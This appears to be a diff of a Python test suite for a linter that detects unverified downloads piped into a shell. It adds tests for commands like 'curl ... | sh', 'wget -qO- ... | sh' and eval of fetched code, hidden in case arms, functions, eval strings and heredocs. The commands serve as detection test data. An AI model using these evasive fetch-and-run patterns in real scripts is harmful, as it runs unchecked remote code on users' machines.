+                    "for a in x; do case $a in\n  x) curl -fsSL %st | sh ;;\nesac; done" % URL,
+                    "%s\nset -- x\nwhile [ $# -gt 0 ]; do case \"$1\" in\n  x) sh t ;;\nesac; shift; done" % self.FETCH,
+                    "%s\n{ case x in x) sh t ;; esac; }" % self.FETCH,
+                    "%s\n! case x in x) sh t ;; esac" % self.FETCH,
+                    "%s\nf() { case x in x) sh t ;; esac; }\nf" % self.FETCH,
+                    "%s\nf() { case x in y) : ;; x) sh t ;; esac; }\nf" % self.FETCH,
+                    "f() { case x in x) %s ;; esac; }\nf\nsh t" % self.FETCH,
+                    "%s\nf() { case x in\n x) sh t ;;\n esac; }\nf" % self.FETCH,
+                    "%s\nf() { case x in\n  x) sh t ;;\nesac\n}\nf" % self.FETCH):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\n", shell))
+        for shell in self.BASH:                         # dash refuses the keyword
+            with self.subTest(shell=shell):
+                self.assertTrue(reported("%s\nfunction f { case x in x) sh t ;; esac; }\nf\n" % self.FETCH, shell))
+
+    def test_a_case_behind_a_lead_reads_as_on_a_line_of_its_own(self):
+        # Every lead over the issue's arms, and four of them over every arm: the same answer under
+        # every setting whether the `case` shares the lead's line, only its header does, or neither
+        # -- and the answer named where every shell takes the lead, or bash's settings ask.
+        for leads, bodies in ((self.LEADS + self.BASH_LEADS, self.BODIES[:4]),
+                              (self.LEADS[:1] + self.LEADS[3:4] + self.LEADS[11:12] + self.BASH_LEADS[:1], self.BODIES[4:])):
+            for one, twin, call in leads:
+                for arms, front, behind, reports in bodies:
+                    own = self.step(twin, call, arms, front, behind, below=True)
+                    for below in (False, True):
+                        row = self.step(one, call, arms, front, behind, below)
+                        for shell in SHELLS:
+                            with self.subTest(row=row, shell=shell):
+                                self.assertEqual(reported(own, shell), reported(row, shell))
+                                if reports is not None and (shell in self.BASH or (one, twin, call) in self.LEADS):
+                                    self.assertEqual(reports, reported(row, shell))
+
+    def test_a_negated_or_a_timed_case_is_read(self):
+        # `!` and `time` have no line of their own to stand on. Every parent runs each `!` row; bash's
+        # run `time case`, which dash has no keyword for (under `sh` it reports too: the price).
+        for row in ("! case x in x) sh t ;; esac", "! case x in\n  x) sh t ;;\nesac",
+                    "if true; then ! case x in x) sh t ;; esac; fi", "! { case x in x) sh t ;; esac; }"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\necho done\n" % (self.FETCH, row), shell))
+        for row in ("time case x in x) sh t ;; esac", "time case x in\n  x) sh t ;;\nesac",
+                    "if true; then time case x in x) sh t ;; esac; fi"):
+            for shell in self.BASH:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\necho done\n" % (self.FETCH, row), shell))
+        # `time` is read through, not left a statement of its own: there it is a wrapper with no
+        # command, which the guard reports whatever the `case` holds. Nothing runs in these.
+        for row in ("time case x in x) echo hi ;; esac", "if true; then time case x in x) echo hi ;; esac; fi",
+                    "time case x in t) echo hi ;; esac"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported("%s\n%s\necho done\n" % (self.FETCH, row), shell))
+
+    def test_a_function_whose_body_is_the_case_is_read(self):
+        # `f() case x in x) sh t ;; esac`: a function's body may be any compound, and here the header
+        # is all that stands in front of the `case`. Every parent runs each; bash 5.2.21 alone takes
+        # the `function` spelling with no braces. A check in such a body, the function never called,
+        # is credited no more than in any arm, and all 16 runs run the download.
+        for row in ("f() case x in x) sh t ;; esac\nf", "f() case x in\n  x) sh t ;;\nesac\nf",
+                    "f() case x in y) : ;; x) sh t ;; esac\nf"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\necho done\n" % (self.FETCH, row), shell))
+        for shell in SHELLS:
+            with self.subTest(shell=shell):
+                self.assertTrue(reported("f() case x in x) curl -fsSL %si.sh | sh ;; esac\nf\necho done\n" % URL, shell))
+                self.assertTrue(reported("%s\n%s\nf() case x in x) sha256sum -c sums || exit 1 ;; esac\nsh t\necho done\n"
+                                         % (self.FETCH, self.SUMS), shell))
+        for shell in self.BASH:
+            with self.subTest(shell=shell):
+                self.assertTrue(reported("%s\nfunction f case x in x) sh t ;; esac\nf\necho done\n" % self.FETCH, shell))
+
+    def test_a_gate_in_an_arm_is_credited_no_more_than_on_a_line_of_its_own(self):
+        # What stands in front of the header is a statement of its own because what reads a `case`
+        # asks for it as its statement's first word. With the header left on the lead's statement
+        # the arm was read as no arm, and a check in it was credited: each of these read CLEAN under
+        # `-e` then, and all 16 runs run the download -- a failure the `!` negates, one in a
+        # condition, a function never called.
+        check = "sha256sum -c sums"
+        for row in ("! case x in x) %s ;; esac" % check, "! { case x in x) %s ;; esac; }" % check,
+                    "if case x in x) %s ;; esac; then :; fi" % check,
+                    "if false; then :; elif case x in x) %s ;; esac; then :; fi" % check,
+                    "while case x in x) %s ;; esac; do break; done" % check,
+                    "until case x in x) %s ;; esac; do break; done" % check,
+                    "f() { case x in x) %s || exit 1 ;; esac; }" % check,
+                    "if true; then case x in y) %s || exit 1 ;; esac; fi" % check):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\n%s\nsh t\necho done\n" % (self.FETCH, self.SUMS, row), shell))
+        # No parent runs the download here, and `main` reports each: it credits a gate in no arm, on
+        # a line of its own or not (the price, as it was).
+        for row in ("if true; then case x in x) %s || exit 1 ;; esac; fi" % check,
+                    "{ case x in x) %s || exit 1 ;; esac; }" % check,
+                    "f() { case x in x) %s || exit 1 ;; esac; }\nf" % check):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\n%s\nsh t\necho done\n" % (self.FETCH, self.SUMS, row), shell))
+
+    def test_other_spellings_and_programs_handed_to_a_shell(self):
+        # A quoted subject, a tab for each blank, `in` on the next line, a `case` in an arm of
+        # another behind a lead, and the lead in a `-c` string, an `eval`, a heredoc: every parent
+        # runs each.
+        for row in ("set -- x\nif true; then case \"$1\" in x) sh t ;; esac; fi",
+                    "if true; then\tcase\tx\tin x) sh t ;; esac; fi", "if true; then case x\nin x) sh t ;; esac; fi",
+                    "if true; then case x in x) case y in y) sh t ;; esac ;; esac; fi",
+                    "case x in x) if true; then case y in y) sh t ;; esac; fi ;; esac",
+                    "if true; then case x in y) : ;; esac; case x in x) sh t ;; esac; fi",
+                    "bash -c 'if true; then case x in x) sh t ;; esac; fi'",
+                    "eval 'f() { case x in x) sh t ;; esac; }; f'",
+                    "bash <<'EOF'\nif true; then case x in x) sh t ;; esac; fi\nEOF"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\necho done\n" % (self.FETCH, row), shell))
+
+    def test_the_controls_read_as_they_did(self):
+        # Reported on `main` too: the `case` as its statement's first word -- on a line of its own,
+        # behind `;`, `&&` and `(`, and as a pipeline's stage; a keyword for its subject, which is no
+        # lead behind `case`; and `for`, whose next word is a name and whose words are words.
+        for row in ("case x in x) sh t ;; esac", "true; case x in x) sh t ;; esac", "true && case x in x) sh t ;; esac",
+                    "( case x in x) sh t ;; esac )", "true | case x in x) sh t ;; esac",
+                    "case if in if) sh t ;; esac", "case then in then) sh t ;; esac", "case time in time) sh t ;; esac",
+                    "if true; then case if in if) sh t ;; esac; fi",
+                    "for case in in; do ( sh t ); done", "for a in case x in; do sh t; done"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\necho done\n" % (self.FETCH, row), shell))
+        # CLEAN, and no parent runs the download: behind an assignment `case` is a command's name and
+        # bash refuses the `)`; `for case in in` loops over a word; a keyword that is an argument, or
+        # quoted, leads nothing.
+        # A pattern that is the fetched file's name is a pattern, behind a keyword for a subject too
+        # (`time` and `if` lead nothing behind `case`) and behind a lead, where `main` read it as a
+        # command and reported it.
+        for row in ("V=1 case x in x) sh t ;; esac", "for case in in; do echo $case; done",
+                    "echo then case x in x", "'then' case x in x",
+                    "case time in t) echo hi ;; esac", "case if in t) echo hi ;; esac",
+                    "if true; then case time in t) echo hi ;; esac; fi"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported("%s\n%s\necho done\n" % (self.FETCH, row), shell))
+        # `for`'s name and its words lead no header, and neither does a command: its words are its
+        # arguments. Read as a header, `case in in` or `case x in` would leave the reader in an arm's
+        # pattern, where a `|` is no pipeline, and the check piped behind it would be no check: it
+        # stops every parent, and each reads CLEAN, as on `main`.
+        gate = "echo '%s  t' | sha256sum -c - || exit 1" % ("a" * 64)
+        for row in ("for case in in\ndo :; done", "for a\nin case x in\ndo :; done",
+                    "echo case x in", "printf '%s\\n' case x in"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported("%s\n%s\n%s\nsh t\necho done\n" % (self.FETCH, row, gate), shell))
+
+
+class TestACaseArmsTokenIsAWordOfItsOwn(unittest.TestCase):
+    """#3014 (HIGH): `case x in x)curl -fsSL URL | sh ;; esac` read CLEAN while every parent ran the
+    download. `_split` made one token of an arm's pattern and its `)`, and whatever stood glued behind
+    the `)` went into it: the arm's first command lost its name, and what was left of the stage was
+    its arguments (#2715). Where the arm starts its line the token also counted as a word the stage
+    had closed, so a `${…}` behind it was no command word and its empty half was never read; and a
+    function's header behind it was a name and a subshell. The token is now a word of its own, and
+    the glued arm reads as the arm with a blank reads. Truth per row, twice over: bash 5.2.21 and
+    3.2.57 under `-e` and `-eo pipefail`, dash under `-e`, and each with no `-e`."""
+
+    FETCH = "curl -fsSLo t %st" % URL
+    SUMS = "echo '%s  t' > sums" % ("a" * 64)
+    BASH = (None, "bash", "bash {0}")
+    # An arm's first command, the lines in front of the `case` and the lines behind it: every parent
+    # runs the download in each.
+    COMMANDS = (("curl -fsSL %si.sh | sh" % URL, (), ()), ("wget -qO- %si.sh | sh" % URL, (), ()),
+                ("curl -fsSLo t %st" % URL, (), ("sh t",)), ("bash -c 'sh t'", (FETCH,), ()),
+                ("eval \"$(curl -fsSL %si.sh)\"" % URL, (), ()), ("sh t", (FETCH,), ()),
+                ("sudo sh t", (FETCH,), ()), ("${Y:+/usr/bin/env true} sh t", (FETCH,), ()),
+                ("${SH:-sh -e} t", (FETCH,), ()), ("${SUDO:+sudo -E} sh t", (FETCH,), ()))
+    # The arm on the `case` line, on a line of its own, and indented there; %s the pattern's `)` and
+    # what stands behind it.
+    LAYOUTS = ("case x in x%s ;; esac", "case x in\nx%s ;;\nesac", "case x in\n  x%s ;;\nesac")
+
+    @staticmethod
+    def step(layout, behind_paren, front=(), behind=()):
+        return "\n".join((*front, layout % behind_paren, *behind, "echo done")) + "\n"
+
+    def test_a_command_glued_to_its_arms_pattern_is_read(self):
+        # No blank behind the pattern's `)`: 10 commands by 3 layouts, and every parent runs each.
+        for command, front, behind in self.COMMANDS:
+            for layout in self.LAYOUTS:
+                row = self.step(layout, ")" + command, front, behind)
+                for shell in SHELLS:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertTrue(reported(row, shell))
+
+    def test_the_glued_arm_reports_wherever_2715_names_it(self):
+        # #2715's acceptance: the glued payload nested two and three deep, in a `$( … )`, behind a
+        # keyword and in a function, in a `-c` string, an `eval` and a heredoc, and with no `;;`
+        # before `esac` -- every parent runs each; in a `$( … )` with no `(` in front of the pattern,
+        # which bash 3.2.57 cannot parse and the others run; and in a `;&` or `;;&` arm, which bash
+        # 5.2.21 alone runs.
+        payload = "curl -fsSL %si.sh | sh" % URL
+        for row in ("case a in a)case b in b)%s;; esac;; esac", "case a in a)case b in b)case c in c)%s;; esac;; esac;; esac",
+                    "case a in\na)case b in\nb)%s;;\nesac;;\nesac", "echo \"$(case a in (a)%s;; esac)\"",
+                    "if true; then case a in a)%s;; esac; fi", "f() { case a in a)%s;; esac; }\nf",
+                    "bash -c 'case a in a)%s;; esac'", "eval 'case a in a)%s;; esac'",
+                    "bash <<'EOF'\ncase a in a)%s;; esac\nEOF", "case a in a)%s\nesac",
+                    "echo \"$(case a in a)%s;; esac)\""):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row % payload + "\necho done\n", shell))
+        for row in ("case a in a) : ;& b)%s;; esac", "case a in a):;& b)%s;; esac", "case a in a) : ;;& *)%s;; esac",
+                    "case a in a)%s;;& *) : ;; esac"):
+            for shell in self.BASH:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row % payload + "\necho done\n", shell))
+
+    def test_a_glued_arm_reads_as_the_arm_with_a_blank(self):
+        # The same answer with the blank and without it, under every setting: for what runs, and for
+        # what does not -- nothing fetched, an arm not taken, a check in an arm (credited in none).
+        # And for `$SHELL t`, one of the rows that go from REPORT to CLEAN: the test below.
+        quiet = (("make all", (), ()), ("echo hi", (self.FETCH,), ()),
+                 ("sha256sum -c sums || exit 1", (self.FETCH, self.SUMS), ("sh t",)),
+                 ("$SHELL t", (self.FETCH,), ()))
+        for command, front, behind in self.COMMANDS + quiet:
+            for layout in self.LAYOUTS + ("case x in y%s ;; esac", "case x in a|x%s ;; esac", "case x in (x%s ;; esac",
+                                          "case x in y) : ;; x%s ;; esac", "case x in *%s ;; esac"):
+                glued = self.step(layout, ")" + command, front, behind)
+                spaced = self.step(layout, ") " + command, front, behind)
+                for shell in SHELLS:
+                    with self.subTest(row=glued, shell=shell):
+                        self.assertEqual(reported(spaced, shell), reported(glued, shell))
+        for shell in SHELLS:
+            with self.subTest(shell=shell):
+                self.assertFalse(reported("case x in x)make all ;; esac\necho done\n", shell))
+                self.assertFalse(reported("%s\ncase x in x)echo hi ;; esac\necho done\n" % self.FETCH, shell))
+
+    def test_a_glued_arms_first_word_is_read_with_the_words_behind_it(self):
+        # `main` lost the word glued to the `)` with the arm's token and read the words behind it as
+        # the command: it reported `x)echo sh t` for `sh t`, and `x)$SHELL t` for `t`, the fetched
+        # file's name. The arm now reads as its words read behind a blank and on a line of their own,
+        # so a report goes wherever `main` reads those words CLEAN there (the coordinator's ruling on
+        # the class, quoted in #3014's PR).
+        # Nothing runs where the first word is a command that does not run the others.
+        # A parent runs each row of the five kinds behind them. Each is `main`'s reading wherever the
+        # words stand, and reports here when the issue it joins lands: a name bash sets, in front of
+        # the fetched file (#2808); a substitution that prints the interpreter there (#2695); a
+        # substitution that prints nothing, in front of a command (#2693); two values glued there
+        # (#3016); an interpreter the table does not name, in front of the fetched file (#3017). For
+        # that last kind the truth is `busybox sh t`'s, all 16 runs: the harness's payload is a
+        # shell script and cannot say what `lua t` runs.
+        nothing_runs = ("echo sh t", "cat t", ": sh t", "true sh t", ": curl -fsSL %si.sh | sh" % URL)
+        kinds = (("nothing runs", nothing_runs),
+                 ("#2808", ("$SHELL t", "${SHELL} t", "\"$SHELL\" t", "$BASH t")),
+                 ("#2695", ("$(echo sh) t", "`echo sh` t", "\"$(echo sh)\" t")),
+                 ("#2693", ("$(true) sh t", "$(true) bash -c 'sh t'")),
+                 ("#3016", ("$X$Y sh t", "$X$Y eval \"sh t\"")),
+                 ("#3017", ("busybox sh t", "busybox ash t", "lua t", "python3.12 t", "fish t")))
+        for kind, rows in kinds:
+            for words in rows:
+                line = "%s\n%s\necho done\n" % (self.FETCH, words)
+                for layout in self.LAYOUTS + ("case x in a|x%s ;; esac", "case x in y) : ;; x%s ;; esac"):
+                    glued, spaced = (self.step(layout, behind + words, (self.FETCH,)) for behind in (")", ") "))
+                    for shell in SHELLS:
+                        with self.subTest(kind=kind, row=glued, shell=shell):
+                            self.assertEqual(reported(line, shell), reported(glued, shell))
+                            self.assertEqual(reported(line, shell), reported(spaced, shell))
+        for words in nothing_runs:
+            for shell in SHELLS:
+                with self.subTest(words=words, shell=shell):
+                    self.assertFalse(reported(self.step(self.LAYOUTS[0], ")" + words, (self.FETCH,)), shell))
+
+    def test_a_word_at_the_head_of_an_arm_that_starts_its_line_is_read_whole(self):
+        # `x) ${SUDO:+sudo -E} sh t ;;` with nothing in front of the arm on its line: the token is no
+        # word the stage closed, so the `${…}` behind it is the command word it is on the `case` line
+        # and behind an indent. Every parent runs each.
+        for word in ("${Y:+/usr/bin/env true} sh t", "${SH:-sh -e} t", "${SUDO:+sudo -E} sh t"):
+            for arm in ("x) %s ;;", "a|x) %s ;;", "a | x) %s ;;", "(x) %s ;;", "*) %s ;;", "y) : ;;\nx) %s ;;"):
+                row = "%s\ncase x in\n%s\nesac\necho done\n" % (self.FETCH, arm % word)
+                for shell in SHELLS:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertTrue(reported(row, shell))
+
+    def test_a_function_header_at_an_arms_head_is_read(self):
+        # `x) f() { sh t; }; f ;;`: behind an arm's token a header is a header, with a blank and
+        # without, behind a pattern of several words too. Every parent runs each; bash's the keyword.
+        for row in ("case x in x) f() { sh t; }; f ;; esac", "case x in x)f() { sh t; }; f;; esac",
+                    "case x in x) f () { sh t; }; f ;; esac", "case x in a | x) f() { sh t; }; f ;; esac",
+                    "case x in (x) f() { sh t; }; f ;; esac", "case x in 'x') f() { sh t; }; f ;; esac",
+                    "case x in\nx) f() { sh t; }; f ;;\nesac", "case x in x) f() { sh t; } ;; esac\nf"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\necho done\n" % (self.FETCH, row), shell))
+        for row in ("case x in x) function f { sh t; }; f ;; esac", "case x in x)function f { sh t; }; f;; esac"):
+            for shell in self.BASH:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\necho done\n" % (self.FETCH, row), shell))
+
+    def test_a_gate_in_a_function_an_arm_defines_is_credited_no_more_than_before(self):
+        # Read as a header, the function an arm defines is read as `main` reads it on lines of its
+        # own, where it credits no check: never called, and all 16 runs run the download; or the arm
+        # not taken, where every parent with no `-e` does.
+        check = "sha256sum -c sums || exit 1"
+        for row in ("case x in x) g() { %s; }; ;; esac" % check, "case x in y) g() { %s; } ;; esac\ng" % check,
+                    "case x in y)g() { %s; };; esac\ng" % check):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\n%s\nsh t\necho done\n" % (self.FETCH, self.SUMS, row), shell))
+
+
 class TestASplitterGapEveryShellReadsWhole(unittest.TestCase):
     """#2756, #2731, #2657: a pipe continued on the next line, an unquoted `${X:-bash -s}`
     default, and `<>` on standard input -- each run by bash 5.2.21, 3.2.57 and dash and read
@@ -2896,50 +7132,6 @@ class TestASplitterGapEveryShellReadsWhole(unittest.TestCase):
                        GET + "bash -s <<'EOF' 1<>/dev/null\n" + body):
             with self.subTest(script=script):
                 self.assertEqual([], defects(script))
-
-
-class TestAQuotedAssignmentLookingWordIsACommand(unittest.TestCase):
-    """#2480: `"X=1" sh tool`, `"A+=x" sh tool`, `A\\+=x sh tool` and `"X"=1 sh tool` were popped
-    as prefix assignments and the step flagged, though bash 5.2.21, 3.2.57 and dash run a command
-    NAMED `X=1` / `A+=x` (not found, rc 127, nothing runs). The splitter now marks where a quote
-    opens or a backslash stands, and a word is an assignment only where nothing before its
-    operator was so written; a quoted VALUE is an assignment still."""
-
-    def test_a_quoted_or_escaped_name_or_operator_is_no_assignment(self):
-        # F- rc127 x4 each: `main` reported "running it under `sh`", nothing ran.
-        for script in ('"X=1" sh tool\n', '"A+=x" sh tool\n', "A\\+=x sh tool\n", '"X"=1 sh tool\n',
-                       "'X=1' sh tool\n", "X\\=1 sh tool\n"):
-            with self.subTest(script=script):
-                self.assertEqual([], defects(GET + script))
-
-    def test_the_controls_are_assignments_still(self):
-        # FR x4 each, reported as on `main`: an unquoted prefix, a quoted VALUE, an escaped blank.
-        for script in ("X=1 sh tool\n", 'X="1" sh tool\n', "A+=x sh tool\n", "X=a\\ b sh tool\n"):
-            with self.subTest(script=script):
-                found = defects(GET + script)
-                self.assertEqual(1, len(found), found)
-                self.assertTrue(found[0][1].startswith("fetches %stool -> tool and running it under `sh`" % URL), found)
-
-
-class TestBuiltinInFrontOfACommand(unittest.TestCase):
-    """#2665: `builtin eval 'curl … | sh'` read CLEAN while both bashes run the pipe (dash has no
-    `builtin`: rc 127, the step stops) -- `command` was read through, `builtin` was the command
-    word. The command walk now pops `builtin` in front of a name, as bash runs the builtin."""
-
-    def test_builtin_in_front_of_eval_is_read_through(self):
-        # FR FR -- FR each; `main` CLEAN.
-        for script in ("builtin eval '%s'\n" % PIPE, "builtin command eval '%s'\n" % PIPE,
-                       "builtin eval 'bash -s' <<'EOF'\n%s\nEOF\n" % PIPE):
-            with self.subTest(script=script):
-                found = defects(script)
-                self.assertEqual(1, len(found), found)
-                self.assertTrue(found[0][1].startswith("hands %si.sh straight to `sh`" % URL), found)
-        # The controls read as they did: `command eval`, bare `eval` (FR x4).
-        for script in ("command eval '%s'\n" % PIPE, "eval '%s'\n" % PIPE):
-            with self.subTest(script=script):
-                self.assertEqual(1, len(defects(script)))
-        # `builtin` before no name runs nothing (`builtin T=x`: "not a shell builtin"): as it was.
-        self.assertEqual([], defects(GET + "builtin T=cuda_1.run\n"))
 
 
 class TestAShellsSoleSubstitutionOperand(unittest.TestCase):
@@ -3125,15 +7317,19 @@ class TestAShellsSoleSubstitutionOperand(unittest.TestCase):
 
     def test_a_string_or_program_word_holding_a_process_substitution_is_unread(self):
         # #2486 keeps a `<(...)` out (`shell_reader.yields_words`): a string
-        # holding one is no script, though it holds a `$(...)` too, and a
-        # program word that is all of one is not `dynamic_program`'s. So the
-        # first two read CLEAN, as at the base, though they run `tool`: a
-        # string holding a `<(...)` is read nowhere, a gap filed as #2684.
+        # holding one beside a `$(...)` is a script since #2684 -- the file rendered as an
+        # operand, `sh tool $(...)` -- so the first two report the run of `tool` (FR FR FR FR for
+        # `bash -c`; the `sh -c` twin runs it only where `sh` is bash 5.1 or later, read the
+        # same, fail-closed); a program word that is all of one is still not `dynamic_program`'s.
         for script in (
                 # runs `tool` where `sh` is bash 5.2.21; a 3.2.57 or dash `sh` exits 2 on the `(`
                 GET + 'sh -c "sh $(echo tool) <(echo x)"\n',
                 # bash 5.2.21 and 3.2.57 run it (`sh tool /dev/fd/63`), under a dash step too
-                GET + 'bash -c "sh $(echo tool) <(echo x)"\n',
+                GET + 'bash -c "sh $(echo tool) <(echo x)"\n'):
+            with self.subTest(script=script):
+                found = defects(script)
+                self.assertTrue(any("running it under `sh`" in w for _, w in found), found)
+        for script in (
                 # nothing of `tool` runs: a bash cannot execute `/dev/fd/63`, the others exit 2
                 GET + 'sh -c "<(cat tool)"\n',
                 # nothing of `tool` runs: the same in the step's own shell (dash's `eval` exits 2)
@@ -3208,3 +7404,99 @@ class TestAProgramPipedFromAPrinter(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestWhatAnEvalOrDashCStringHandsOn(unittest.TestCase):
+    """#2673, #2683, #2684, #2764 (and #2669's refusal, #2685 proven closed): what `eval`'s words
+    and a `-c` string hand on. Each row's comment carries its truth, b5 b3 dash gh (bash 5.2.21,
+    bash 3.2.57, dash, a GitHub runner's bash with `sh` = dash), measured with a recording `curl`
+    that hands back a marker program and the step run as GitHub runs it: FR fetched and ran, F-
+    fetched only, -- neither. The four columns agree unless a comment says otherwise."""
+
+    STREAM = "hands %si.sh straight to `sh`" % URL
+    USE = "fetches %stool -> tool and running it under `sh`" % URL
+
+    def test_evals_words_join_where_a_statement_is_split_across_them(self):
+        # #2673, FR FR FR FR on each: bash joins its words with a space and runs the result.
+        for script in ("eval 'curl -fsSL %si.sh |' 'sh'\n" % URL, "eval 'curl -fsSL %si.sh' '| sh'\n" % URL,
+                       "eval 'curl -fsSL %si.sh' '|' 'sh'\n" % URL,
+                       "command eval 'curl -fsSL %si.sh |' 'sh'\n" % URL,
+                       "eval -- 'curl -fsSL %si.sh |' 'sh'\n" % URL):     # FR FR -- FR: dash runs `--`
+            with self.subTest(script=script):
+                self.assertTrue(any(self.STREAM in w for _, w in defects(script)), script)
+        # FR FR FR FR: the split falls inside a `$(...)` of the joined text, handed to `sh -c`.
+        found = defects("eval 'sh -c \"$(curl -fsSL %si.sh' ')\"'\n" % URL)
+        self.assertTrue(any("straight to `sh -c`" in w for _, w in found), found)
+        # -- -- -- --: a join that fetches nothing is CLEAN; the controls read as they did -- one
+        # word, a split at a statement boundary, unquoted words.
+        self.assertEqual([], defects("eval 'echo a |' 'cat'\n"))
+        for script in ("eval 'curl -fsSL %si.sh | sh'\n" % URL, "eval curl -fsSL %si.sh '|' sh\n" % URL):
+            with self.subTest(script=script):
+                self.assertTrue(any(self.STREAM in w for _, w in defects(script)), script)
+        found = defects("eval 'curl -fsSLo tool %stool;' 'sh tool'\n" % URL)
+        self.assertTrue(any(self.USE in w for _, w in found), found)
+
+    def test_words_with_no_split_statement_still_read_one_by_one(self):
+        # The join is made only where a word begins or ends with an operator: `eval sh
+        # "./cuda_*.run"` keeps its own reading (the operand reader re-parses its words with their
+        # quoting), and `eval sh "$(echo tool)"` its two sentences (#2486, #2487).
+        found = defects("curl -fsSLo cuda_1.run %scuda_1.run\neval sh \"./cuda_*.run\"\n" % URL)
+        self.assertTrue(any("cuda_1.run" in w for _, w in found), found)
+        found = defects(GET + 'eval sh "$(echo tool)"\n')
+        self.assertEqual(2, len(found), found)
+        self.assertTrue(found[0][1].startswith("runs `eval` on `$(...)`"), found)
+
+    def test_a_join_the_reader_refuses_is_refused_on_both_paths(self):
+        # #2669, -- -- -- -- (rc 0, nothing fetched): `eval 'echo $(cat <<A' 'x' 'A)'` joins to a
+        # heredoc inside a substitution the reader cannot end; it is refused whole, fail-closed,
+        # on the string path as on the stdin walk's -- one answer, naming the text bash runs.
+        found = defects("eval 'echo $(cat <<A' 'x' 'A)'\n")
+        self.assertEqual(1, len(found), found)
+        self.assertTrue(found[0][1].startswith("cannot read this step"), found)
+        self.assertEqual([], defects("eval 'echo \"a' 'b\"'\n"))      # a join the reader reads
+
+    def test_a_word_holding_a_substitution_reaches_the_stdin_walk_rendered(self):
+        # #2683, FR FR FR FR: `"sh $(echo -s)"` is `sh -s` (one printer spells it) and `"sh $(cat
+        # f)"` is `sh $(...)`, a word that may vanish -- either way `sh` reads the heredoc. The
+        # price, F-+chk x4: `"sh $(echo -n)"` runs nothing, but a check in its body counts for
+        # nothing and the use after is reported.
+        for script in ("eval \"sh $(echo -s)\" <<'EOF'\n%s\nEOF\n" % PIPE, "eval \"sh $(cat f)\" <<'EOF'\n%s\nEOF\n" % PIPE):
+            with self.subTest(script=script):
+                self.assertTrue(any(self.STREAM in w for _, w in defects(script)), script)
+        found = defects(GET + "eval \"sh $(echo -n)\" <<'EOF'\n%s\nEOF\nchmod +x tool; ./tool\n" % CHECK)
+        self.assertTrue(any(UNGATED % "eval" in w for _, w in found), found)
+        # `eval "$(cat x)" <<'EOF'`: a word all expansion still names no shell; #2483's word stands.
+        self.assertEqual([], defects("eval \"$(cat x)\" <<'EOF'\n%s\nEOF\n" % PIPE))
+
+    def test_a_rendered_shell_reaches_the_heredoc(self):
+        # #2764, FR FR FR FR: `eval "$(echo 'sh')"` is `sh`, and the heredoc its program.
+        found = defects("eval \"$(echo 'sh')\" <<'EOF'\n%s\nEOF\n" % PIPE)
+        self.assertTrue(any(self.STREAM in w for _, w in found), found)
+        # FR FR -- FR (dash refuses `<(`): the FILE is the program, and where it is a shell reading
+        # stdin the heredoc is that shell's; `echo hi` as the FILE reads nothing (-- -- -- --).
+        for script in ("bash <(echo 'sh') <<'EOF'\n%s\nEOF\n" % PIPE, "source <(echo 'sh') <<'EOF'\n%s\nEOF\n" % PIPE):
+            with self.subTest(script=script):
+                self.assertTrue(any(self.STREAM in w for _, w in defects(script)), script)
+        self.assertEqual([], defects("bash <(echo 'echo hi') <<'EOF'\n%s\nEOF\n" % PIPE))
+        self.assertEqual([], defects("eval \"$(echo 'cat')\" <<'EOF'\n%s\nEOF\n" % PIPE))
+        # No check in such a body counts (reader None): F-+chk x4, the use after is reported.
+        found = defects(GET + "bash <(echo 'sh') <<'EOF'\n%s\nEOF\nchmod +x tool; ./tool\n" % CHECK)
+        self.assertTrue(any(UNGATED % "bash" in w for _, w in found), found)
+
+    def test_a_process_substitution_in_a_string_hands_a_file_not_nothing(self):
+        # #2684, FR FR FR FR for `bash -c`; the `sh -c` twin runs only where `sh` is bash 5.1 or
+        # later (F- F- F- F- here, rc 2) and is read the same, fail-closed: the string is
+        # `sh tool $(...)`, `tool` its program, the file an operand `tool` ignores.
+        for script in (GET + 'bash -c "sh $(echo tool) <(echo x)"\n', GET + 'sh -c "sh $(echo tool) <(echo x)"\n'):
+            with self.subTest(script=script):
+                self.assertTrue(any(self.USE in w for _, w in defects(script)), script)
+        # F- F- F- F- (rc 2): no shell, no fetch -- CLEAN; `bash <(curl …)` at the top is #2495's.
+        self.assertEqual([], defects(GET + 'sh -c "cat <(echo x)"\n'))
+        self.assertTrue(any("straight to `bash`" in w for _, w in defects("bash <(curl -fsSL %si.sh)\n" % URL)))
+
+    def test_2685_is_closed_on_main(self):
+        # #2685, FR FR FR FR: a `-c` string whose heredoc delimiter is a substitution reads on
+        # past the body, and the pipeline after it is reported -- as its literal twin is.
+        for script in ('sh -c "cat <<$(echo E) >/dev/null\nE\n%s"\n' % PIPE, 'sh -c "cat <<E >/dev/null\nE\n%s"\n' % PIPE):
+            with self.subTest(script=script):
+                self.assertTrue(any(self.STREAM in w for _, w in defects(script)), script)
